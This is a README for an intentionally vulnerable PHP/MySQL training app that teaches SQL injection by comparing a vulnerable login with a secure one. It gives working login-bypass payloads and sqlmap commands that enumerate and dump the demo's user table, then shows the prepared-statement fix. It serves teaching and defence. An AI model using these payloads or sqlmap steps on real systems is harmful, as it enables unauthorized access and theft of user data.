<div align="center">

# CyberAuth

### A hands-on SQL Injection education platform built with PHP & MySQL

[![Live Demo](https://img.shields.io/badge/🚀_Live_Demo-cyber--auth--production.up.railway.app-0d9488?style=for-the-badge)](https://cyber-auth-production.up.railway.app/)
[![PHP](https://img.shields.io/badge/PHP-8.0+-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://php.net)
[![MySQL](https://img.shields.io/badge/MySQL-8.0-4479A1?style=for-the-badge&logo=mysql&logoColor=white)](https://mysql.com)
[![Railway](https://img.shields.io/badge/Deployed_on-Railway-0B0D0E?style=for-the-badge&logo=railway)](https://railway.app)
[![OWASP](https://img.shields.io/badge/OWASP-A03:2021-red?style=for-the-badge)](https://owasp.org/Top10/A03_2021-Injection/)
[![Educational](https://img.shields.io/badge/Purpose-Educational_Only-orange?style=for-the-badge)](#disclaimer)

<br/>

 **CyberAuth** is an intentionally vulnerable web application designed to teach SQL Injection vulnerabilities through real, hands-on demonstration.
 It runs two side-by-side authentication systems — one vulnerable, one secure — so you can attack, observe, and understand the difference.

<br/>

---

</div>

## ⚠️ Disclaimer

 **This project is strictly for educational purposes.**
 CyberAuth contains an **intentionally vulnerable** login system designed to demonstrate SQL Injection attacks in a controlled, safe environment.

 ❌ Do **not** deploy this on a production server<br>
 ❌ Do **not** use this code in real applications<br>
 ❌ Do **not** attempt these techniques on systems you don't own<br>
 ✅ **Do** use this to learn, experiment, and understand secure coding<br>

---

## 📸 Screenshots

 **Home Page** — Choose between the vulnerable and secure authentication paths

<!-- SCREENSHOT: Home page — https://cyber-auth-production.up.railway.app/ -->
 ![Home Page](https://raw.githubusercontent.com/arya-lunawat/Cyber-Auth/main/public/assets/images/home.png)

---

 **Vulnerable Login** — Real-time SQL query preview as you type, with injection payload guide

<!-- SCREENSHOT: Vulnerable login — https://cyber-auth-production.up.railway.app/vulnerable/login.php -->
 ![Vulnerable Login](https://raw.githubusercontent.com/arya-lunawat/Cyber-Auth/main/public/assets/images/vulnerable-login.png)

---

 **Secure Login** — Parameterized queries, bcrypt hashing, session hardening

<!-- SCREENSHOT: Secure login — https://cyber-auth-production.up.railway.app/secure/login.php -->
 ![Secure Login](https://raw.githubusercontent.com/arya-lunawat/Cyber-Auth/main/public/assets/images/secure-login.png)

---

 **Admin Dashboard** — Attack logs, payload history, and user statistics

<!-- SCREENSHOT: Admin dashboard -->
 ![Admin Dashboard](https://raw.githubusercontent.com/arya-lunawat/Cyber-Auth/main/public/assets/images/admin-dashboard.png)

---

## 🚀 Live Demo

| Page | URL | Purpose |
|------|-----|---------|
| 🏠 Home | [cyber-auth-production.up.railway.app](https://cyber-auth-production.up.railway.app/) | Landing page |
| ☠️ Vulnerable Login | [/vulnerable/login.php](https://cyber-auth-production.up.railway.app/vulnerable/login.php) | Attack this |
| 🔒 Secure Login | [/secure/login.php](https://cyber-auth-production.up.railway.app/secure/login.php) | Compare with this |
| 📝 Register | [/register.php](https://cyber-auth-production.up.railway.app/register.php) | Create a test account |

**Test credentials you can register yourself, or use the injection payloads below to bypass authentication entirely.**

---

## 🎯 What You Will Learn

By using CyberAuth, you will understand:

- How SQL Injection exploits **unsanitized string concatenation** in database queries
- Why **prepared statements with parameterized queries** completely eliminate injection risk
- How **bcrypt password hashing** protects against credential theft
- Why **session ID regeneration** prevents session fixation attacks
- How **attack logging and rate limiting** provide defence-in-depth
- The difference between **signature-based detection** (bypassable) and **structural prevention** (unbypassable)

---

## 💉 SQL Injection — Theory & Working Payloads

The vulnerable login constructs its query like this:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password'
```

Because `$username` and `$password` are raw user input inserted directly into the SQL string, an attacker can **break out of the string context** and rewrite the query logic entirely.

---

### Payload 1 — OR-based Authentication Bypass

**Input:**
```
Username:  admin' OR '1'='1
Password:  anything
```

**Resulting query:**
```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'
AND password = 'anything'
```

**Why it works:**

The injected `OR '1'='1'` is always true. Because of SQL operator precedence (`AND` binds tighter than `OR`), the database evaluates this as:

```sql
WHERE (username = 'admin') OR ('1'='1' AND password = 'anything')
```

Since `'1'='1'` is always true, the `OR` branch is always satisfied. The query returns the first row in the `users` table — typically the admin account — and authentication is bypassed entirely without needing a valid password.

---

### Payload 2 — Double-quote Tautology (Both Fields)

**Input:**
```
Username:  ' OR ''='
Password:  ' OR ''='
```

**Resulting query:**
```sql
SELECT * FROM users
WHERE username = '' OR ''=''
AND password = '' OR ''=''
```

**Why it works:**

`''=''` (empty string equals empty string) is always true. This payload doesn't target a specific username — it makes both conditions unconditionally true, returning all rows. The application logs in as whoever appears first in the result set. This payload is particularly interesting because it uses no alphanumeric characters at all, which defeats simple keyword-based filters that block words like `OR` or `admin`.

---

### Payload 3 — Comment-based Truncation

**Input:**
```
Username:  admin' --
Password:  anything
```

**Resulting query:**
```sql
SELECT * FROM users
WHERE username = 'admin' --' AND password = 'anything'
```

**Why it works:**

`--` is the MySQL line comment operator. Everything after it — including the password check — is treated as a comment and completely ignored by the database. The query reduces to:

```sql
SELECT * FROM users WHERE username = 'admin'
```

No password is checked at all. As long as a user named `admin` exists, authentication succeeds. This is one of the most commonly seen real-world injection patterns because it is clean, reliable, and easy to understand.

---

### Why Some Payloads Fail

CyberAuth deliberately demonstrates **realistic attacker behaviour** — not every payload works on every system. Real-world SQL injection requires trial and error because success depends on:

| Factor | Impact |
|--------|--------|
| Query structure | WHERE clause ordering affects operator precedence |
| MySQL comment syntax | `--` requires a trailing space in some parsers; `#` is MySQL-specific |
| AND vs OR precedence | AND always binds tighter, affecting tautology payloads |
| Whitespace handling | Some parsers strip or normalize whitespace |
| String termination | Unbalanced quotes cause syntax errors, not bypasses |
| Application logic | Some apps check row count, not just whether a row was returned |

This is why automated tools like `sqlmap` use dozens of payload variants — you will see this in the Kali Linux section below.

---

### The Secure Fix — Prepared Statements

The secure login uses parameterized queries where the SQL structure is compiled **before** user input is ever inserted:

```php
// Vulnerable — string concatenation
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Secure — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");
$stmt->execute([$username, $password]);
```

With a prepared statement, user input is **never interpreted as SQL**. Even if you type `admin' OR '1'='1`, the database treats the entire string as a literal username value — it will simply find no matching user and return an empty result.

---

## Kali Linux — Automated SQL Injection with sqlmap
 
[sqlmap](https://sqlmap.org) is an open-source penetration testing tool that automates SQL injection detection and exploitation. The steps below show exactly how a security professional would attack CyberAuth's vulnerable login — and confirm that the secure login resists the same attack.
 
> ⚠️ **This is shown for educational purposes only. Only run sqlmap against systems you own or have explicit written permission to test.**
 
sqlmap comes pre-installed on Kali Linux. Verify with:
```bash
sqlmap --version
```
 
---
 
### Step 1️ — Detect SQL Injection
 
```bash
sqlmap -u "https://cyber-auth-production.up.railway.app/vulnerable/login.php" \
  --forms --batch --dbs
```
 
**What to expect:**
- sqlmap automatically detects the login form fields
- Confirms the `username` parameter is injectable
- Lists all accessible databases on the server
**What the flags mean:**
 
| Flag | Purpose |
|------|---------|
| `-u` | Target URL |
| `--forms` | Auto-detect and test all form fields on the page |
| `--batch` | Non-interactive — auto-answer all prompts |
| `--dbs` | Enumerate all databases once injection is confirmed |
  
**Injection types sqlmap will find on this app:**
 
| Type | How it works |
|------|-------------|
| **Boolean-based blind** | Asks the DB true/false questions, infers data from response differences |
| **Time-based blind** | Uses `SLEEP()` delays — works even when no output is shown |
| **UNION-based** | Appends a second `SELECT` to pull data directly into the response |
| **Error-based** | Extracts data from MySQL error messages leaked in the response |
 
---
 
### Step 2️ — List Tables in `cyberauth`
 
```bash
sqlmap -u "https://cyber-auth-production.up.railway.app/vulnerable/login.php" \
  --forms --batch -D cyberauth --tables
```
 
**Expected output:**
```
Database: cyberauth
[2 tables]
+-------------+
| attack_logs |
| users       |
+-------------+
```
  
---
 
### Step 3️ — Dump the Users Table
 
```bash
sqlmap -u "https://cyber-auth-production.up.railway.app/vulnerable/login.php" \
  --forms --batch -D cyberauth -T users --dump
```
 
**Expected output:**
```
Table: users
+----+----------+--------------------------------------------------------------+
| id | username | password_hash                                                |
+----+----------+--------------------------------------------------------------+
| 1  | admin    | $2y$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    |
+----+----------+--------------------------------------------------------------+
```
 
> Even with the hash exposed, **bcrypt makes offline cracking computationally infeasible** — this is why the secure login hashes passwords with `password_hash()` even though the vulnerable login fails to protect the query itself.
  
---
 
### Step 4️ — Test the Secure Login
 
```bash
sqlmap -u "https://cyber-auth-production.up.railway.app/secure/login.php" \
  --forms --batch --dbs
```
 
**Expected output:**
```
[WARNING] all tested parameters do not appear to be injectable
```
 
This is the key takeaway — **the exact same sqlmap command that fully compromised the vulnerable login finds nothing on the secure login.** Prepared statements don't just make injection harder, they make it structurally impossible. sqlmap has no attack surface to work with because user input is never interpreted as SQL.
  
---
 

## 🏗️ Architecture

```
Cyber-Auth/
├── app/
│   ├── Config/
│   │   ├── config.php          # App configuration
│   │   └── Database.php        # PDO connection handler
│   ├── Controllers/
│   │   ├── AuthController.php           # Shared auth logic
│   │   ├── VulnerableAuthController.php # Intentionally unsafe queries
│   │   ├── SecureAuthController.php     # Prepared statements + bcrypt
│   │   └── AdminController.php          # Dashboard & logs
│   ├── Helpers/
│   │   ├── functions.php       # Utility functions
│   │   └── validators.php      # Input validation
│   ├── Middleware/
│   │   ├── AuthMiddleware.php   # Session authentication guard
│   │   └── AdminMiddleware.php  # Admin role guard
│   ├── Models/
│   │   ├── User.php            # User entity & queries
│   │   └── Log.php             # Attack log entity
│   └── Services/
│       ├── Logger.php          # Attack logging service
│       ├── RateLimiter.php     # Brute-force protection
│       ├── SecurityScanner.php # Payload detection
│       └── SessionManager.php  # Secure session handling
├── database/
│   └── schema.sql              # Table definitions & seed data
├── public/
│   ├── assets/css/style.css    # Dark theme stylesheet
│   ├── vulnerable/login.php    # ☠️ Intentionally vulnerable login
│   ├── secure/login.php        # 🔒 Secure login
│   ├── admin/                  # Attack dashboard
│   ├── index.php               # Landing page
│   ├── register.php            # User registration
│   └── logout.php              # Session destruction
├── .env.example                # Environment variable template
├── composer.json               # PSR-4 autoloading + phpdotenv
└── README.md
```

**Design pattern:** MVC-inspired layered architecture. Controllers handle HTTP, Services contain business logic, Models handle data access. The vulnerable and secure implementations share the same Models and Services — only the Controller query construction differs, which isolates exactly what makes each version safe or unsafe.

---

## ⚙️ Run Locally with Docker

```bash
# 1. Clone the repo
git clone https://github.com/arya-lunawat/Cyber-Auth.git
cd Cyber-Auth

# 2. Copy environment config
cp .env.example .env

# 3. Start with Docker Compose
docker-compose up --build

# 4. Open in browser
# http://localhost:8080
```
---

## 🔒 Security Features (Secure Implementation)

| Feature | Implementation |
|---------|---------------|
| SQL Injection prevention | PDO prepared statements with parameterized queries |
| Password storage | `password_hash()` with bcrypt (cost factor 12) |
| Password verification | `password_verify()` — timing-safe comparison |
| Session hardening | ID regenerated on login, HttpOnly + SameSite cookies |
| Account lockout | Rate limiting after repeated failed attempts |
| Attack logging | Every attempt logged with IP, payload, and timestamp |
| Input validation | Server-side length and character validation |

---

## 📊 Vulnerability Comparison

| Feature | ☠️ Vulnerable | 🔒 Secure |
|---------|-------------|----------|
| Query construction | String concatenation | Prepared statements |
| Password storage | Plaintext | bcrypt hash |
| SQL Injection | ✅ Exploitable | ❌ Impossible |
| Brute-force | Unlimited attempts | Rate limited |
| Session fixation | Possible | Prevented |
| Attack logging | Partial | Full |

---

## 🛠️ Tech Stack

- **Backend:** PHP 8.0+, PDO (MySQL driver)
- **Database:** MySQL 8.0
- **Frontend:** Vanilla HTML/CSS (no frameworks — keeps focus on the security logic)
- **Auth:** Native `password_hash()` / `password_verify()` with bcrypt
- **Deployment:** Railway (PHP + MySQL)
- **Dependencies:** `vlucas/phpdotenv` via Composer

---

## 📚 Further Reading

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) — Official vulnerability reference
- [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/) — OWASP Top 10 context
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection) — Hands-on practice
- [sqlmap Documentation](https://sqlmap.org/) — Automated injection tool used in this guide
- [PHP PDO Prepared Statements](https://www.php.net/manual/en/pdo.prepared-statements.php) — The fix, documented

---

## 👨‍💻 Author

**Arya Lunawat**<br>
MBA-Tech | NMIMS Indore

[![GitHub](https://img.shields.io/badge/GitHub-arya--lunawat-181717?style=flat&logo=github)](https://github.com/arya-lunawat)

---

<div align="center">

**Built for learning. Break it, understand it, secure it.**

*If this project helped you understand SQL Injection, consider giving it a ⭐*

</div>
